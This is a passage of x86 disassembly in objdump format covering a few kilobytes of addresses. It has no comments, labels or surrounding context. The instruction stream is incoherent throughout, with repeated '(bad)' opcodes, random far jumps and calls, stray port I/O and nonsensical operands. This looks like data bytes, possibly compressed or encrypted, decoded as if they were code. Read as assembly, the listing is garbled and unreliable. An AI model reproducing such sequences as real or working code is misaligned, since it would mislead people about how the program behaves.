  421fbd:	xchg   BYTE PTR [edx+0x5901c69],ch
  421fc3:	pop    eax
  421fc4:	adc    eax,0x79abae36
  421fca:	je     0x422043
  421fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fcd:	ja     0x421fe2
  421fcf:	sub    ecx,ebp
  421fd1:	and    eax,0x42957b5e
  421fd6:	mul    ch
  421fd8:	sbb    DWORD PTR [ecx],ecx
  421fda:	(bad)  
  421fdb:	fld    DWORD PTR [esi]
  421fdd:	mov    bh,0x12
  421fdf:	dec    eax
  421fe0:	mov    ebp,0x7ac5071c
  421fe5:	mov    eax,ds:0xf0b79e96
  421fea:	lods   al,BYTE PTR ds:[esi]
  421feb:	out    dx,eax
  421fec:	daa    
  421fed:	enter  0x52e2,0x4b
  421ff1:	pop    ecx
  421ff2:	fadd   QWORD PTR [eax]
  421ff4:	mov    cl,0x85
  421ff6:	mov    al,0x13
  421ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ff9:	jbe    0x421fa0
  421ffb:	fnstcw WORD PTR [edi+eiz*4+0x57ec413d]
  422002:	std    
  422003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422004:	xor    al,al
  422006:	fwait
  422007:	cmp    al,0xe2
  422009:	mov    al,ds:0x12e424d0
  42200e:	mov    gs,WORD PTR [edx-0x1d604db]
  422014:	mov    ds:0x32269ac8,eax
  422019:	and    eax,DWORD PTR [eax]
  42201b:	and    al,0xcf
  42201d:	cmp    ecx,DWORD PTR [eax]
  42201f:	outs   dx,BYTE PTR ds:[esi]
  422020:	sbb    eax,0x5bdacfcc
  422025:	stos   BYTE PTR es:[edi],al
  422026:	ja     0x422008
  422028:	add    ebx,ebp
  42202a:	jo     0x422068
  42202c:	xor    dh,bl
  42202e:	aam    0xaa
  422030:	adc    ecx,ecx
  422032:	mov    ah,0x90
  422034:	addr16 maskmovq mm1,mm7
  422038:	cmp    DWORD PTR [edx-0x26063f85],edx
  42203e:	ret    0xe4e5
  422041:	and    edx,DWORD PTR [edi-0x59]
  422044:	sbb    eax,0x968b98fc
  422049:	jae    0x422028
  42204b:	or     dh,BYTE PTR [esi]
  42204d:	sbb    edx,esi
  42204f:	test   eax,0x890854c8
  422054:	outs   dx,DWORD PTR ds:[esi]
  422055:	jecxz  0x42208e
  422057:	and    ch,ch
  422059:	jge    0x422019
  42205b:	sub    DWORD PTR [edx+0x356cb5dc],esp
  422061:	or     ah,BYTE PTR [edx+0x46]
  422064:	je     0x422065
  422066:	loop   0x422025
  422068:	jno    0x422047
  42206a:	idiv   DWORD PTR [esi]
  42206c:	enter  0xb0da,0x2c
  422070:	(bad)  
  422071:	or     ebp,DWORD PTR [ebp+0x168999]
  422077:	(bad)  
  422078:	sbb    al,0xbf
  42207a:	mov    ch,0x84
  42207c:	arpl   si,si
  42207e:	xchg   BYTE PTR [edi+0x17],dh
  422081:	aam    0x13
  422083:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  422085:	into   
  422086:	adc    ebx,DWORD PTR [ebx-0x76]
  422089:	mov    BYTE PTR [edx-0x2753d635],cl
  42208f:	jg     0x422104
  422091:	aaa    
  422092:	nop
  422093:	fidivr WORD PTR [edi+0x4e]
  422096:	pop    ss
  422097:	or     ebp,DWORD PTR [ecx+0x1d3b694a]
  42209d:	mov    al,0xad
  42209f:	mov    ecx,0x13a9e72e
  4220a4:	arpl   WORD PTR [edi+0x19e3980a],cx
  4220aa:	inc    ebx
  4220ab:	nop
  4220ac:	pop    edi
  4220ad:	add    ebp,ecx
  4220af:	dec    edx
  4220b0:	lock add bl,dh
  4220b3:	pusha  
  4220b4:	loop   0x42204a
  4220b6:	out    dx,al
  4220b7:	push   ss
  4220b8:	xor    eax,0x1087af9
  4220bd:	in     eax,dx
  4220be:	shl    DWORD PTR [esi+ecx*4],1
  4220c1:	aas    
  4220c2:	stc    
  4220c3:	dec    ecx
  4220c4:	jns    0x42211f
  4220c6:	add    DWORD PTR [bx],edi
  4220c9:	or     BYTE PTR [ebp-0x41],ch
  4220cc:	stos   DWORD PTR es:[edi],eax
  4220cd:	sbb    ecx,DWORD PTR [eax]
  4220cf:	out    dx,al
  4220d0:	jmp    0x4220de
  4220d2:	mov    eax,ds:0xd9be91b
  4220d7:	add    BYTE PTR [esi+edx*4+0x501637fc],dl
  4220de:	mov    ebx,0xe3de5e6e
  4220e3:	out    0x45,al
  4220e5:	pop    ss
  4220e6:	xor    edi,DWORD PTR ds:0xa4025ad5
  4220ec:	jae    0x422130
  4220ee:	jle    0x422113
  4220f0:	les    edx,FWORD PTR [eax-0x51]
  4220f3:	cmp    DWORD PTR [eax+0x6a01debd],edi
  4220f9:	inc    edi
  4220fa:	pop    esi
  4220fb:	std    
  4220fc:	scas   al,BYTE PTR es:[edi]
  4220fd:	lods   al,BYTE PTR ds:[esi]
  4220fe:	int3   
  4220ff:	push   DWORD PTR [edi-0xf06d1cd]
  422105:	adc    esi,ebp
  422107:	stos   DWORD PTR es:[edi],eax
  422108:	(bad)  
  422109:	jmp    0x4e8be4af
  42210e:	pop    ebx
  42210f:	lds    ebp,FWORD PTR [esi+ebx*2+0xe6aa65f]
  422116:	outs   dx,BYTE PTR ds:[esi]
  422117:	fbstp  TBYTE PTR [eax+0x7b5fb775]
  42211d:	shl    BYTE PTR [eax+0x60],1
  422120:	scas   al,BYTE PTR es:[edi]
  422121:	mov    bl,0xd6
  422123:	aas    
  422124:	je     0x4220ec
  422126:	jnp    0x4220e6
  422128:	xchg   ah,ah
  42212a:	mov    al,ds:0xba4e2759
  42212f:	leave  
  422130:	cwde   
  422131:	and    cl,BYTE PTR [esi+0x273b0790]
  422137:	loopne 0x422186
  422139:	mov    eax,0xb33a13aa
  42213e:	(bad)  
  42213f:	mov    al,ds:0x5f580c66
  422144:	jg     0x4220d6
  422146:	dec    eax
  422147:	dec    ebp
  422148:	dec    ebp
  422149:	ja     0x4221a6
  42214b:	add    al,0x86
  42214d:	iret   
  42214e:	je     0x4221c7
  422150:	jg     0x42218a
  422152:	push   esp
  422153:	xchg   esi,eax
  422154:	add    DWORD PTR [ebp+0x130d9da],eax
  42215a:	jne    0x42212d
  42215c:	and    al,0x4a
  42215e:	dec    esi
  42215f:	jle    0x4221b7
  422161:	or     eax,DWORD PTR [esi+0x2f]
  422164:	(bad)  
  422165:	xchg   esp,eax
  422166:	and    al,0x24
  422168:	xor    bl,BYTE PTR [edx+0x6243e5dd]
  42216e:	push   ecx
  42216f:	(bad)  [ebx+0x9]
  422172:	mov    edx,0xa2fa038b
  422177:	jns    0x422185
  422179:	add    al,0x81
  42217b:	inc    esp
  42217c:	jmp    0x200:0xdf46ffde
  422183:	cwde   
  422184:	cs sbb al,0xc9
  422187:	xchg   BYTE PTR ds:0xc8e6c8c3,cl
  42218d:	call   0x9d97:0x6dfa5624
  422194:	inc    eax
  422195:	std    
  422196:	out    0x3d,al
  422198:	fistp  QWORD PTR [esi+0x11c73575]
  42219e:	add    esp,DWORD PTR [esi-0x3a]
  4221a1:	fsub   QWORD PTR [ebx-0x2ef51f4a]
  4221a7:	and    bl,al
  4221a9:	pusha  
  4221aa:	sub    al,0x4
  4221ac:	jbe    0x4221b6
  4221ae:	push   ecx
  4221af:	das    
  4221b0:	pop    edi
  4221b1:	gs add eax,0x6a939951
  4221b7:	and    bl,bl
  4221b9:	cli    
  4221ba:	adc    al,0x65
  4221bc:	and    eax,0xf7bbe718
  4221c1:	adc    eax,0x4cc37589
  4221c6:	sub    BYTE PTR [eax+0x32],cl
  4221c9:	sub    esp,DWORD PTR [edi+0x12]
  4221cc:	mov    esi,DWORD PTR ds:0x65c058ae
  4221d2:	shr    BYTE PTR [ebx+0x1918822b],0x19
  4221d9:	adc    bl,BYTE PTR [edx+0x23]
  4221dc:	xor    DWORD PTR [eax],eax
  4221de:	dec    esp
  4221df:	mov    ds:0x39b7e741,al
  4221e4:	adc    eax,DWORD PTR [ebx-0x3]
  4221e7:	les    ecx,FWORD PTR [ebx]
  4221e9:	sahf   
  4221ea:	lods   eax,DWORD PTR ds:[esi]
  4221eb:	jmp    0x42219d
  4221ed:	xor    edx,DWORD PTR [ebx+0x61e05378]
  4221f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221f4:	rcl    DWORD PTR [ebx],0xbe
  4221f7:	fisttp DWORD PTR [edi+0x4b233a60]
  4221fd:	xchg   ebp,eax
  4221fe:	lods   al,BYTE PTR ds:[esi]
  4221ff:	add    DWORD PTR [ebx+0x2947c988],ebp
  422205:	mov    WORD PTR [edi],?
  422207:	mov    es,WORD PTR [ebx+esi*8+0x36]
  42220b:	aas    
  42220c:	pop    ecx
  42220d:	push   esp
  42220e:	add    ch,BYTE PTR [eax+0x45]
  422211:	rcl    BYTE PTR [ebp+0x66],1
  422214:	sbb    esi,DWORD PTR [ecx-0x15]
  422217:	lods   eax,DWORD PTR cs:[esi]
  422219:	cmp    dl,0x2a
  42221c:	xor    al,0x82
  42221e:	xchg   esi,eax
  42221f:	jmp    0x4221fe
  422221:	cmp    edi,DWORD PTR [ebx+0x4b]
  422224:	sub    BYTE PTR [esi],ch
  422226:	fcomp  DWORD PTR [edx+0x350583ad]
  42222c:	pop    ss
  42222d:	push   edx
  42222e:	mov    esp,0x2e122d5
  422233:	sbb    eax,0x46721750
  422238:	je     0x422246
  42223a:	push   0x23
  42223c:	inc    esp
  42223d:	out    dx,al
  42223e:	fcmovnbe st,st(0)
  422240:	and    cl,ch
  422242:	call   0x12323a65
  422247:	out    0x4c,al
  422249:	add    esi,ebp
  42224b:	loop   0x4222c6
  42224d:	pop    ecx
  42224e:	sbb    DWORD PTR [ecx-0x4c],ecx
  422251:	int    0xde
  422253:	out    0x33,al
  422255:	clc    
  422256:	pusha  
  422257:	cld    
  422258:	test   al,0x89
  42225a:	mov    ch,0x45
  42225c:	and    eax,0x5a6f2442
  422261:	add    DWORD PTR [edx-0x35],edi
  422264:	inc    eax
  422265:	pushf  
  422266:	call   0xe520:0x4b299c1a
  42226d:	or     eax,0xe230eb6d
  422272:	int3   
  422273:	(bad)  
  422274:	in     eax,0x16
  422276:	(bad)  
  422277:	xchg   ecx,eax
  422278:	shr    DWORD PTR [ecx+0x44],cl
  42227b:	jno    0x4222b5
  42227d:	xchg   edi,eax
  42227e:	sbb    DWORD PTR [edi+0x581461a4],ebx
  422284:	shr    BYTE PTR [edx+0x35],1
  422287:	pop    esp
  422288:	fadd   DWORD PTR [edi+eiz*8]
  42228b:	xchg   esi,eax
  42228c:	pop    ds
  42228d:	sub    cl,BYTE PTR [edx]
  42228f:	out    0x21,eax
  422291:	mul    ecx
  422293:	dec    ebx
  422294:	inc    ecx
  422295:	and    esp,esp
  422297:	lahf   
  422298:	shl    dl,1
  42229a:	call   0x362d:0x48304772
  4222a1:	les    ebp,FWORD PTR ds:[eax]
  4222a4:	cld    
  4222a5:	adc    BYTE PTR [esi-0x7],bl
  4222a8:	xchg   ebp,eax
  4222a9:	in     eax,0xa7
  4222ab:	add    bl,bh
  4222ad:	adc    eax,DWORD PTR es:[edi]
  4222b0:	mov    eax,ds:0x5c82f0db
  4222b5:	mov    ds,WORD PTR [ecx]
  4222b7:	nop
  4222b8:	lahf   
  4222b9:	pop    ebx
  4222ba:	das    
  4222bb:	call   FWORD PTR [edi+0x4a2acfc1]
  4222c1:	sub    BYTE PTR [ebx-0x1b],cl
  4222c4:	adc    esi,DWORD PTR [ebp+0x2a]
  4222c7:	inc    edx
  4222c8:	adc    al,0x47
  4222ca:	pop    esp
  4222cb:	and    DWORD PTR [edi],esi
  4222cd:	push   0xffffffa4
  4222cf:	hlt    
  4222d0:	shr    BYTE PTR [edx],0x10
  4222d3:	adc    al,BYTE PTR [ebx+0x16]
  4222d6:	add    BYTE PTR [ebp+0x19],bl
  4222d9:	(bad)  
  4222da:	mov    ebp,edx
  4222dc:	add    eax,0xf4751a29
  4222e1:	mov    bl,ah
  4222e3:	mov    bl,0xb9
  4222e5:	adc    eax,0xd29a35b2
  4222ea:	adc    eax,0x218b3135
  4222ef:	pop    es
  4222f0:	imul   esi,DWORD PTR [ebx+eiz*4+0x82ed898],0xffffffe9
  4222f8:	or     DWORD PTR [edx-0x5321d885],esp
  4222fe:	xchg   esp,eax
  4222ff:	stos   DWORD PTR es:[edi],eax
  422300:	popa   
  422301:	xchg   edx,eax
  422302:	fbld   TBYTE PTR [ebp+ecx*4+0x319c7b95]
  422309:	add    ebp,DWORD PTR [ebp-0x27233952]
  42230f:	or     al,0x12
  422311:	test   BYTE PTR [edi],bl
  422313:	enter  0x6930,0x19
  422317:	push   esp
  422318:	and    eax,0xcfe75ef9
  42231d:	jns    0x42232d
  42231f:	je     0x422315
  422321:	mov    ebp,0xa0fc4b84
  422326:	ficomp DWORD PTR ds:0x879b777
  42232c:	dec    ebx
  42232d:	push   edx
  42232e:	mov    edx,0x6023b092
  422333:	mov    dl,0x55
  422335:	xor    eax,0xcea3f3a9
  42233a:	shr    ecx,cl
  42233c:	stos   DWORD PTR es:[edi],eax
  42233d:	in     al,dx
  42233e:	repz cli 
  422340:	aam    0x4c
  422342:	jecxz  0x42238c
  422344:	xchg   BYTE PTR [edi-0x17],ah
  422347:	inc    edx
  422348:	int3   
  422349:	mov    dh,0x6a
  42234b:	mov    dh,0xfc
  42234d:	sbb    BYTE PTR [edi+0xc],0xbd
  422351:	fdiv   st(6),st
  422354:	out    dx,eax
  422355:	aad    0x5d
  422357:	jmp    0x797c5745
  42235c:	out    0x4e,eax
  42235e:	pop    ebx
  42235f:	pop    ds
  422360:	mov    BYTE PTR [ecx-0x73],ch
  422363:	dec    esi
  422364:	mov    BYTE PTR [ebp-0x80],0x5c
  422368:	add    al,0xe3
  42236a:	bound  eax,QWORD PTR [ecx+ebp*1-0x6e13958f]
  422371:	xchg   ecx,eax
  422372:	mov    DWORD PTR [ecx],edi
  422374:	xor    BYTE PTR [edi+0x7f],bh
  422377:	stos   BYTE PTR es:[edi],al
  422378:	pop    edx
  422379:	sbb    eax,0x2437f7f3
  42237e:	pop    ebp
  42237f:	add    dh,BYTE PTR ds:0x6fbf97f1
  422385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422386:	pop    edi
  422387:	jbe    0x422314
  422389:	(bad)  
  42238b:	push   ebp
  42238c:	xchg   edx,eax
  42238d:	ret    
  42238e:	stos   DWORD PTR es:[edi],eax
  42238f:	jns    0x422312
  422391:	mov    cl,0x27
  422393:	jge    0x422341
  422395:	xchg   esp,eax
  422396:	(bad)  
  422397:	and    edi,ecx
  422399:	xor    al,BYTE PTR [ecx+0x35f22410]
  42239f:	ret    0x7f4f
  4223a2:	cs mov edx,0xc18d97ab
  4223a8:	iret   
  4223a9:	dec    esi
  4223aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ab:	in     eax,0x3
  4223ad:	add    esp,DWORD PTR [esi-0x12e04142]
  4223b3:	adc    al,0x9
  4223b5:	pop    ecx
  4223b6:	cli    
  4223b7:	sbb    ecx,ebx
  4223b9:	std    
  4223ba:	mov    ebp,ebp
  4223bc:	call   0xe18d:0x4d82cfa8
  4223c3:	or     DWORD PTR [edx+eax*2+0x29525294],esi
  4223ca:	push   DWORD PTR [eax-0x63]
  4223cd:	in     al,0x25
  4223cf:	or     al,0xb
  4223d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d2:	add    eax,0x4dafc219
  4223d7:	mov    WORD PTR [ebx-0x1c],ss
  4223da:	shl    eax,0x22
  4223dd:	ins    BYTE PTR es:[edi],dx
  4223de:	adc    eax,0xd7904ef6
  4223e3:	addr16 es int3 
  4223e6:	rol    BYTE PTR [eax+0x8],cl
  4223e9:	outs   dx,DWORD PTR ds:[esi]
  4223ea:	mov    eax,DWORD PTR [ecx]
  4223ec:	and    al,0x8d
  4223ee:	das    
  4223ef:	retf   0x613d
  4223f2:	fnsave [edi+eiz*1-0x7b5d0cc]
  4223f9:	scas   eax,DWORD PTR es:[edi]
  4223fa:	test   ebp,eax
  4223fc:	push   0xd3da04a
  422401:	xchg   edx,eax
  422402:	ret    0xdd2e
  422405:	and    dh,cl
  422407:	push   ds
  422408:	add    DWORD PTR [ebx+0x65],ecx
  42240b:	sub    DWORD PTR [eax],esp
  42240d:	sbb    eax,0x702a17a7
  422412:	mov    BYTE PTR [esi],dh
  422414:	xor    dl,ch
  422416:	inc    esp
  422417:	sti    
  422418:	push   ds
  422419:	mov    eax,ds:0x261d524c
  42241e:	push   cs
  42241f:	aad    0x6f
  422421:	sahf   
  422422:	mov    al,0xe9
  422424:	jno    0x4223df
  422426:	add    DWORD PTR [ebx-0x44],eax
  422429:	pop    esp
  42242a:	ja     0x4223e0
  42242c:	scas   al,BYTE PTR es:[edi]
  42242d:	mov    ch,0xcb
  42242f:	or     DWORD PTR ds:0xbafec8f4,ebx
  422435:	sbb    WORD PTR [edi-0x6c],dx
  422439:	or     al,0x40
  42243b:	loope  0x42243a
  42243d:	mov    gs:0x65c332d7,al
  422443:	dec    ebx
  422444:	xchg   ecx,eax
  422445:	fiadd  WORD PTR [ecx]
  422447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422448:	sti    
  422449:	push   cs
  42244a:	aas    
  42244b:	shl    bh,cl
  42244d:	mov    BYTE PTR [edx-0x184c8779],ch
  422453:	sub    eax,0x2a19e780
  422458:	dec    edx
  422459:	dec    ebx
  42245a:	cmp    eax,0x2f6ee00f
  42245f:	push   ss
  422460:	mov    ebx,0xd59eb701
  422465:	sbb    BYTE PTR [ebx+0x22e6caf2],bh
  42246b:	imul   ecx,DWORD PTR [esi+0x7a],0x551a6698
  422472:	xchg   ecx,eax
  422473:	pop    es
  422474:	push   eax
  422475:	dec    edx
  422476:	xor    eax,0xb8857d7
  42247b:	lods   al,BYTE PTR ds:[esi]
  42247c:	ja     0x4224ca
  42247e:	or     BYTE PTR [ebp-0xf223221],bl
  422484:	cli    
  422485:	jno    0x4224c5
  422487:	inc    esp
  422488:	push   esp
  422489:	jge    0x42241e
  42248b:	mov    al,ds:0xb0bc82b9
  422490:	fwait
  422491:	xor    DWORD PTR [edi],edx
  422493:	xchg   bh,cl
  422495:	cdq    
  422496:	pop    esp
  422497:	adc    al,0x62
  422499:	dec    eax
  42249a:	cmc    
  42249b:	cmp    BYTE PTR [esi],al
  42249d:	push   esi
  42249e:	xor    bh,BYTE PTR [ebp-0xb]
  4224a1:	jb     0x42244e
  4224a3:	or     al,0x9c
  4224a5:	add    eax,0x96fdff0b
  4224aa:	loope  0x42244f
  4224ac:	(bad)  
  4224ad:	mov    al,ds:0x54bc7905
  4224b2:	xchg   BYTE PTR [ecx],ch
  4224b4:	pop    esp
  4224b5:	add    DWORD PTR [edi],0xffffffa7
  4224b8:	test   DWORD PTR [ebx],esp
  4224ba:	sbb    ebp,DWORD PTR [esp+ecx*4]
  4224bd:	into   
  4224be:	(bad)  [esi]
  4224c0:	mov    ch,0xde
  4224c2:	loop   0x4224e9
  4224c4:	jmp    0xc5f8:0xd874b428
  4224cb:	shl    ebp,cl
  4224cd:	repnz fcompp 
  4224d0:	fwait
  4224d1:	adc    al,dh
  4224d3:	rcr    BYTE PTR [edi-0x461fe084],cl
  4224d9:	pop    edi
  4224da:	(bad)
  4224dd:	cmp    esp,0xf56f2cf8
  4224e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224e4:	adc    al,0x69
  4224e6:	mov    al,ds:0xa794ee52
  4224eb:	push   0x6e82cf69
  4224f0:	pop    es
  4224f1:	mov    edx,0x302b5770
  4224f6:	cld    
  4224f7:	and    al,BYTE PTR [eax-0x10deb730]
  4224fd:	int    0xe7
  4224ff:	sti    
  422500:	lds    esi,FWORD PTR [ebx+esi*1]
  422503:	icebp  
  422504:	repnz ins DWORD PTR es:[edi],dx
  422506:	lods   eax,DWORD PTR ds:[esi]
  422507:	xor    edi,DWORD PTR [ecx+0x20cac583]
  42250d:	ret    0x9fcc
  422510:	jecxz  0x4224f7
  422512:	inc    ecx
  422513:	inc    esi
  422514:	add    ebx,edi
  422516:	cmp    eax,0xdca7d34e
  42251b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42251c:	test   eax,0x154608c7
  422521:	jbe    0x4224af
  422523:	jl     0x42250c
  422525:	mov    al,0x41
  422527:	pusha  
  422528:	call   0xb4237519
  42252d:	add    ebp,DWORD PTR [esi]
  42252f:	fldenv [esi-0x72]
  422532:	mov    edx,0xe5696482
  422537:	out    dx,eax
  422538:	cmp    BYTE PTR [edx+0x55],ah
  42253b:	push   edi
  42253c:	bound  edx,QWORD PTR [edx+0x1e81ee81]
  422542:	sti    
  422543:	jmp    0x42250f
  422545:	sbb    BYTE PTR [edx-0x27322c23],ah
  42254b:	push   ds
  42254c:	mov    ch,0xce
  42254e:	cs dec eax
  422550:	mov    eax,DWORD PTR [ebx-0x39]
  422553:	dec    ebx
  422554:	rcr    DWORD PTR [eax-0x19],0x18
  422558:	pop    edx
  422559:	dec    ecx
  42255a:	mov    dl,0x4c
  42255c:	push   0xffffffcd
  42255e:	xor    eax,0x6cd88d0b
  422563:	ins    DWORD PTR es:[edi],dx
  422564:	jnp    0x42251e
  422566:	dec    ecx
  422567:	cmp    DWORD PTR [edi+0x26],edi
  42256a:	test   eax,0xcb70251c
  42256f:	inc    edi
  422570:	inc    edx
  422571:	js     0x422558
  422573:	push   ss
  422574:	mov    bl,0xb0
  422576:	xchg   eax,edi
  422578:	cmc    
  422579:	adc    BYTE PTR ds:0xbae3578b,0xa1
  422580:	mov    DWORD PTR [esi+0x41b07828],0x8c56138d
  42258a:	push   cs
  42258b:	aam    0x48
  42258d:	fs jbe 0x42254b
  422590:	fiadd  WORD PTR [ecx-0x68f06f42]
  422596:	push   ecx
  422597:	push   es
  422598:	cld    
  422599:	xchg   edi,eax
  42259a:	adc    dh,bh
  42259c:	jl     0x422545
  42259e:	mov    esp,0x97df11b0
  4225a3:	sbb    BYTE PTR [ebx-0x65dd7dd6],ch
  4225a9:	sub    cl,ch
  4225ab:	adc    esp,esp
  4225ad:	je     0x422570
  4225af:	lods   eax,DWORD PTR ds:[esi]
  4225b0:	shl    DWORD PTR [eax-0x4c581a00],0x3
  4225b7:	lahf   
  4225b8:	test   DWORD PTR [ebp+0xd],ebx
  4225bb:	pop    esp
  4225bc:	sub    DWORD PTR [ebx+ecx*4],0xffffffbe
  4225c0:	cmp    al,0xce
  4225c2:	and    esp,esi
  4225c4:	repnz les ebx,FWORD PTR [eax+0x2b]
  4225c8:	push   esp
  4225c9:	ins    BYTE PTR es:[edi],dx
  4225ca:	sahf   
  4225cb:	stc    
  4225cc:	ret    
  4225cd:	mov    edi,0x44db888e
  4225d2:	outs   dx,BYTE PTR ds:[esi]
  4225d3:	jmp    0xb9f91ead
  4225d8:	repz xor DWORD PTR [edi+0x7d],ebp
  4225dc:	pop    ecx
  4225dd:	mov    ds:0x2e514fe8,al
  4225e2:	add    al,0x13
  4225e4:	daa    
  4225e5:	mov    BYTE PTR ds:0x8525e4e9,bh
  4225eb:	jl     0x4225ac
  4225ed:	adc    BYTE PTR [ebx],dl
  4225ef:	dec    esi
  4225f0:	sti    
  4225f1:	jmp    0x5f49:0xce0b2e12
  4225f8:	imul   ebx,esp,0x2e
  4225fb:	ja     0x422601
  4225fd:	frstor [ebp+0x2]
  422600:	stos   BYTE PTR es:[edi],al
  422601:	jbe    0x422667
  422603:	test   BYTE PTR [ecx+0x223d15b5],ah
  422609:	pop    eax
  42260a:	add    eax,DWORD PTR [edx]
  42260c:	xor    BYTE PTR [esi],ch
  42260e:	ins    BYTE PTR es:[edi],dx
  42260f:	mov    DWORD PTR [ebx],esp
  422611:	adc    eax,0xd69f5b55
  422616:	push   edi
  422617:	std    
  422618:	and    DWORD PTR [edx],esi
  42261a:	dec    ebx
  42261b:	loope  0x422667
  42261d:	push   0xfffffff4
  42261f:	sub    cl,BYTE PTR [ebp-0x13c6706a]
  422625:	cmp    esp,DWORD PTR [esi+eiz*1+0x7ebb5ae8]
  42262c:	leave  
  42262d:	add    eax,eax
  42262f:	sti    
  422630:	mov    esp,0xad73c643
  422635:	mov    ebx,0x9de6b9c3
  42263a:	dec    esp
  42263b:	sti    
  42263c:	xor    al,0xde
  42263e:	mov    bl,0xb6
  422640:	lahf   
  422641:	mov    ebx,0x877745b0
  422646:	inc    edx
  422647:	jl     0x422682
  422649:	pop    es
  42264a:	xor    al,dh
  42264c:	jae    0x422684
  42264e:	mov    bl,0xfa
  422650:	or     cl,dh
  422652:	retf   
  422653:	cdq    
  422654:	pop    esi
  422655:	lahf   
  422656:	xor    ebp,DWORD PTR [edx]
  422658:	cmp    eax,0x6d72e65c
  42265d:	pop    edx
  42265e:	and    eax,0x2ea1f962
  422663:	and    eax,0x2d62ceca
  422668:	mov    ebp,0xf7c5fc2c
  42266d:	pushf  
  42266e:	ja     0x422639
  422670:	test   al,0xb8
  422672:	int3   
  422673:	jecxz  0x42260c
  422675:	mov    esi,0x4749e8ce
  42267a:	jmp    DWORD PTR [edx-0x6f12ef68]
  422680:	(bad)  
  422681:	push   ecx
  422682:	inc    edx
  422683:	ins    DWORD PTR es:[edi],dx
  422684:	cmp    ch,BYTE PTR [esp+eiz*8-0x5b]
  422688:	sub    bl,ah
  42268a:	inc    ecx
  42268b:	xchg   DWORD PTR ds:0xea44304f,edi
  422691:	pop    ecx
  422692:	xor    BYTE PTR [ecx+eiz*8],cl
  422695:	mov    ecx,0xfbabeb9d
  42269a:	test   al,0xca
  42269c:	cmp    eax,0x2f02d53d
  4226a1:	push   ecx
  4226a2:	(bad)  
  4226a3:	aam    0xa1
  4226a5:	mov    ds:0xccc952f9,eax
  4226aa:	jge    0x422725
  4226ac:	stos   BYTE PTR es:[edi],al
  4226ad:	imul   edx,eax
  4226b0:	push   0x75d86332
  4226b5:	xor    DWORD PTR [esi],ebx
  4226b7:	mov    bl,0x0
  4226b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226ba:	pop    es
  4226bb:	pop    esi
  4226bc:	xor    BYTE PTR [eax-0x55],bh
  4226bf:	sub    al,0x64
  4226c1:	pop    esi
  4226c2:	mov    edi,0x2110f0a9
  4226c7:	mov    ecx,0x8748265f
  4226cc:	mov    edi,ebp
  4226ce:	xchg   ebp,eax
  4226cf:	jns    0x42269d
  4226d1:	xor    eax,0x2eeaf997
  4226d6:	push   ss
  4226d7:	dec    edi
  4226d8:	outs   dx,BYTE PTR ds:[si]
  4226da:	mov    BYTE PTR ds:0xd345d399,ah
  4226e0:	push   0x1a
  4226e2:	mov    ?,WORD PTR [ecx-0x6c]
  4226e5:	out    dx,eax
  4226e6:	in     eax,dx
  4226e7:	outs   dx,BYTE PTR ds:[esi]
  4226e8:	fild   QWORD PTR [edi+ecx*4-0x1b]
  4226ec:	retf   0x6373
  4226ef:	leave  
  4226f0:	mov    ebp,?
  4226f2:	pop    ebp
  4226f3:	mov    cl,0xf8
  4226f5:	sbb    ebx,ebp
  4226f7:	outs   dx,BYTE PTR ds:[esi]
  4226f8:	cmp    DWORD PTR [ebx-0xfd0bc11],edi
  4226fe:	pop    esi
  4226ff:	fsqrt  
  422701:	or     al,0xbe
  422703:	(bad)  
  422704:	jbe    0x422760
  422706:	pop    ebp
  422707:	mov    dl,BYTE PTR [ebp+ebx*1+0x5c0b01ee]
  42270e:	cld    
  42270f:	stos   BYTE PTR es:[edi],al
  422710:	loop   0x422768
  422712:	sub    BYTE PTR [ebp-0x2d81f75c],dl
  422718:	sbb    edx,DWORD PTR [esi+0x4d]
  42271b:	push   edx
  42271c:	ret    0x438e
  42271f:	call   0xb753b23e
  422724:	pop    ebp
  422725:	adc    eax,0x17a6b193
  42272a:	sbb    esp,DWORD PTR [edi]
  42272c:	outs   dx,BYTE PTR ds:[esi]
  42272d:	adc    DWORD PTR [edx+ecx*4+0x4793622a],esp
  422734:	daa    
  422735:	mov    edi,0xbccacb0
  42273a:	sbb    BYTE PTR [edi+0x1],ah
  42273d:	lahf   
  42273e:	mul    WORD PTR [ecx-0x9]
  422742:	push   ebp
  422743:	stos   BYTE PTR es:[edi],al
  422744:	pop    ss
  422745:	sub    BYTE PTR [esi-0x1003f12d],ah
  42274b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42274c:	pop    ebp
  42274d:	and    eax,0xedc4eefa
  422752:	jns    0x4226ec
  422754:	sar    DWORD PTR [edx+esi*2],1
  422757:	pop    esi
  422758:	in     eax,dx
  422759:	pop    ebx
  42275a:	mov    bh,BYTE PTR [edi]
  42275c:	das    
  42275d:	(bad)  
  42275e:	fdivr  QWORD PTR [edx+0x6abca74c]
  422764:	push   cs
  422765:	enter  0x53a9,0xfb
  422769:	std    
  42276a:	jp     0x422742
  42276c:	out    dx,al
  42276d:	scas   al,BYTE PTR es:[edi]
  42276e:	xchg   esi,esp
  422770:	popf   
  422771:	push   ecx
  422772:	jbe    0x4226fc
  422774:	test   al,0xdb
  422776:	hlt    
  422777:	leave  
  422778:	ret    
  422779:	xadd   DWORD PTR [edx-0x1f8bd954],ecx
  422780:	add    DWORD PTR [esi+0x23d056e1],eax
  422786:	in     al,dx
  422787:	and    BYTE PTR [ebx],0xb7
  42278a:	mov    eax,0x879d197d
  42278f:	inc    esp
  422790:	push   ebx
  422791:	mov    eax,ds:0x940572dd
  422796:	jo     0x4227ce
  422798:	jl     0x4227aa
  42279a:	xchg   BYTE PTR [edx-0x4fb088ff],ch
  4227a0:	ror    DWORD PTR [ebx-0x34],0x47
  4227a4:	inc    ebx
  4227a5:	mov    al,0x52
  4227a7:	(bad)  
  4227a9:	mov    edi,0xf8461516
